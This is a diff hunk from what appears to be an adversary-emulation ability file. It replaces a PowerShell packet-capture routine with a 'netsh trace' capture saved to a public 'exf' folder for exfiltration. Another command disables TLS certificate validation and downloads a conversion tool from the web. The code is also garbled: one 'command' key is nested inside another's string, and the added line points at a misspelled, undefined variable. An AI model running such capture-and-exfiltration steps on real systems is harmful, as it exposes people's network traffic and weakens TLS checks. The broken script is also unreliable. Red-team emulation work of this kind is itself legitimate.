@@ -15,11 +15,9 @@
     name: psh
     build_target: null
     payloads: []
-    command: "$Destination_path = \"$env:PUBLIC\\exf\\capture.etl\";\nNew-NetEventSession\
-      \ -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $Destination_path;\n\
-      Add-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\"\
-      ;\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession\
-      \ -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\ncommand: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
+    command: "$Destination_path=\"$env:PUBLIC\\exf\\capture.etl\";\nnetsh trace start\
+      \ capture=yes tracefile=$Desination_file;\nStart-Sleep -s 60;\nnetsh trace stop;\n\
+      if (Test-Path $Destination_path) {\n  echo $Destination_path;\ncommand: '[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\
       \ { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"\
       https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\"\
       ,\n      \"etl2pcapng.zip\");\n      New-Item -ItemType \"directory\" $env:PUBLIC\\\
